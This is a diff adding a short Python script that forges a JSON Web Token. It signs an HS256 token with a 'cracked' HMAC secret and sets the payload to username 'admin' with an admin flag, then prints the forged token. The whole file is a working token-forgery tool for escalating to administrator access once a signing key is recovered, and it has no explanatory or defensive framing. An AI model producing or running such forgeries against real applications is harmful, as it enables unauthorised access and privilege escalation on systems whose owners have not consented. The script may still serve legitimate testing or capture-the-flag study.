@@ -1,0 +1,29 @@
+# pip3 install PyJWT
+#pip3 install jwt
+import jwt
+
+# === Cracked HMAC secret ===
+secret = 'secret'  # replace with your cracked secret
+
+# === Custom header ===
+headers = {
+    "typ": "JWT",
+    "alg": "HS256"
+}
+
+# === Custom payload ===
+payload = {
+    "username": "admin",
+    "admin": 1
+}
+
+# === Encode the token ===
+token = jwt.encode(
+    payload,
+    key=secret,
+    algorithm='HS256',
+    headers=headers
+)
+
+# === Output ===
+print(f"[+] Forged JWT:\n{token}")
